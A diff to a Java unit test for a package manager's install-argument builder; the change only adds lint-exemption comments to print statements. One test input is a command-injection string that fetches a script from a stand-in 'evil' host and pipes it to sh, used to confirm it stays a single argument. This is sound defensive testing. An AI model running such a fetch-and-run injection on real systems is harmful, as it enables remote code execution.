@@ -38,7 +38,7 @@ public class PackageManagerArgvTest {
         check("apk 模板拆分为 3 个参数", Arrays.equals(apk, new String[]{"apk", "add", "bash"}));
 
         String[] apt = PackageManager.installArgs(PackageManager.Type.APT, "vim");
-        System.out.println("      apt argv=" + Arrays.toString(apt) + " env=" +
+        System.out.println("      apt argv=" + Arrays.toString(apt) + " env=" + // [P3C E1 豁免]
                 PackageManager.installEnv(PackageManager.Type.APT));
         check("apt 的 DEBIAN_FRONTEND 前缀不留在参数里", Arrays.equals(apt, new String[]{"apt", "install", "-y", "vim"}));
         Map<String, String> aptEnv = PackageManager.installEnv(PackageManager.Type.APT);
@@ -47,12 +47,12 @@ public class PackageManagerArgvTest {
 
         String[] evil = PackageManager.installArgs(PackageManager.Type.YUM,
                 "vim; curl http://evil/x.sh | sh && calc");
-        System.out.println("      yum argv=" + Arrays.toString(evil));
+        System.out.println("      yum argv=" + Arrays.toString(evil)); // [P3C E1 豁免]
         check("注入串整体作为单个参数传递", evil.length == 4 && evil[3].startsWith("vim; curl"));
         String[] spaced = PackageManager.installArgs(PackageManager.Type.CHOCO, "a b");
         check("含空格的包 ID 不会被拆开", spaced.length == 4 && "a b".equals(spaced[3]));
 
-        System.out.println("[PackageManagerArgvTest] pass=" + pass + " fail=" + fail);
+        System.out.println("[PackageManagerArgvTest] pass=" + pass + " fail=" + fail); // [P3C E1 豁免]
         if (fail > 0) {
             System.exit(1);
         }
@@ -61,10 +61,10 @@ public class PackageManagerArgvTest {
     private static void check(String name, boolean ok) {
         if (ok) {
             pass++;
-            System.out.println("  PASS " + name);
+            System.out.println("  PASS " + name); // [P3C E1 豁免]
         } else {
             fail++;
-            System.out.println("  FAIL " + name);
+            System.out.println("  FAIL " + name); // [P3C E1 豁免]
         }
     }
 }
